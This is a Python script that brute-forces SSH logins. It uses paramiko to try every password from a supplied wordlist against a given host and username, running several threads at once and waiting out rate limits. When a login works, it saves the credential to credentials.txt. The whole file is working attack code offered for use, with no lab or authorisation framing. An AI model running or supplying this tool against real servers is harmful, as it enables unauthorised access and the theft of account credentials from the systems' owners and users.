import paramiko
import socket
import time
from colorama import init, Fore
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse
import logging

# initialize colorama
init()

GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET
BLUE = Fore.BLUE

# Setup logging
logging.basicConfig(filename='ssh_bruteforce.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

def is_ssh_open(hostname, username, password):
    # initialize SSH client
    client = paramiko.SSHClient()
    # add to known hosts
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username=username, password=password, timeout=3)
    except socket.timeout:
        # this is when host is unreachable
        logging.error(f"Host: {hostname} is unreachable, timed out.")
        print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")
        return False
    except paramiko.AuthenticationException:
        logging.warning(f"Invalid credentials for {username}:{password}")
        print(f"{RED}[!] Invalid credentials for {username}:{password}{RESET}")
        return False
    except paramiko.SSHException as e:
        logging.warning(f"SSHException: {e}")
        print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}")
        # sleep for a minute
        time.sleep(60)
        return is_ssh_open(hostname, username, password)
    else:
        # connection was established successfully
        logging.info(f"Found combo: HOSTNAME: {hostname} USERNAME: {username} PASSWORD: {password}")
        print(f"{GREEN}[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
        return True
    finally:
        client.close()

def main(host, user, passlist, max_workers=4):
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_password = {executor.submit(is_ssh_open, host, user, password): password for password in passlist}
        for future in as_completed(future_to_password):
            password = future_to_password[future]
            try:
                if future.result():
                    # if combo is valid, save it to a file
                    with open("credentials.txt", "w") as cred_file:
                        cred_file.write(f"{user}@{host}:{password}")
                    break
            except Exception as exc:
                logging.error(f'{password} generated an exception: {exc}')

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SSH Bruteforce Python script.")
    parser.add_argument("host", help="Hostname or IP Address of SSH Server to bruteforce.")
    parser.add_argument("-P", "--passlist", required=True, help="File that contain password list in each line.")
    parser.add_argument("-u", "--user", required=True, help="Host username.")
    parser.add_argument("-w", "--workers", type=int, default=4, help="Number of concurrent workers (default: 4).")

    # parse passed arguments
    args = parser.parse_args()
    host = args.host
    passlist_file = args.passlist
    user = args.user
    max_workers = args.workers

    # read the password file
    with open(passlist_file) as f:
        passlist = f.read().splitlines()

    # start brute-forcing
    main(host, user, passlist, max_workers)
